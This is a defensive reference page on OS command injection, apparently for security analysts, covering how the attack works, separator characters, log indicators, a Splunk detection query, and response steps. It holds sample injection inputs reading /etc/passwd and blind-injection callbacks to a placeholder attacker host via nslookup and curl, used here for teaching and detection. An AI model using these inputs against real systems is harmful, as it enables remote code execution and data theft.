# Command injection

!!! abstract "In one line"
    The application passes user input to an **operating system shell**, and the attacker adds their own commands, getting code execution on the server.

| | |
|---|---|
| **MITRE ATT&CK** | [T1190 Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/), then [T1059 Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) |
| **OWASP** | A05:2025 Injection · CWE-78 |
| **Common targets** | Router / firewall admin pages ("ping" or "traceroute" tools), file conversion features, IoT devices |

## How it works

A "network test" page runs:

```bash
ping -c 1 <input>
```

The attacker enters:

```text
8.8.8.8; cat /etc/passwd
```

The server runs:

```bash
ping -c 1 8.8.8.8; cat /etc/passwd
```

The `;` ends the first command and starts the attacker's.

## Command separators

| Characters | Meaning |
|---|---|
| `;` | Run next command (Linux) |
| `&` / `&&` | Run next / run next if the first succeeded (Linux and Windows) |
| `|` / `||` | Pipe / run next if the first failed |
| `` `cmd` `` or `$(cmd)` | Run `cmd` and insert its output (Linux) |
| `%0a` | Newline (URL-encoded) |

**Blind** command injection (no output shown): attacker uses `; sleep 10` (response delayed) or `; nslookup x.attacker.com` / `; curl http://attacker/` (a callback proves it ran).

## What you see in logs

| Log source | What to look for |
|---|---|
| Web access log (decoded) | `;`, `|`, `&&`, `` ` ``, `$(` followed by `id`, `whoami`, `uname`, `cat /etc/passwd`, `curl`, `wget`, `nslookup`, `ping` |
| **EDR / Sysmon 1 on the server** | The web server process spawning a shell: `httpd`/`nginx`/`php-fpm`/`java` → `sh`/`bash`; `w3wp.exe` → `cmd.exe`/`powershell.exe` |
| Sysmon 3 / firewall | The **server** making outbound connections (`curl`, `wget`, reverse shell to port 4444 etc.) |
| DNS logs | Server resolving strange domains (out-of-band tests like Burp Collaborator / interactsh domains) |

## How to detect it

The strongest signal is on the server, not in the URL: **a web server process should almost never start a shell**.

```spl title="Example Splunk search (Linux EDR / auditd process events)"
index=edr parent_process_name IN ("httpd", "apache2", "nginx", "php-fpm", "java", "node")
  process_name IN ("sh", "bash", "dash", "id", "whoami", "uname", "curl", "wget", "nc")
| table _time, host, parent_process_name, process_name, process_command_line
```

## How to respond

1. Treat it as **remote code execution**: isolate the server.
2. Review **every command** the web server user ran (EDR, auditd, shell history).
3. Look for persistence: [web shells](file-upload-web-shell.md), cron jobs, SSH keys, new users.
4. Check whether the attacker moved from the server to the internal network.
5. **Fix:** don't call the shell with user input; use language APIs (e.g. a ping library) instead; if unavoidable, strict allowlist validation (e.g. only an IP address format), run the app as a low-privilege user.

## References

- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
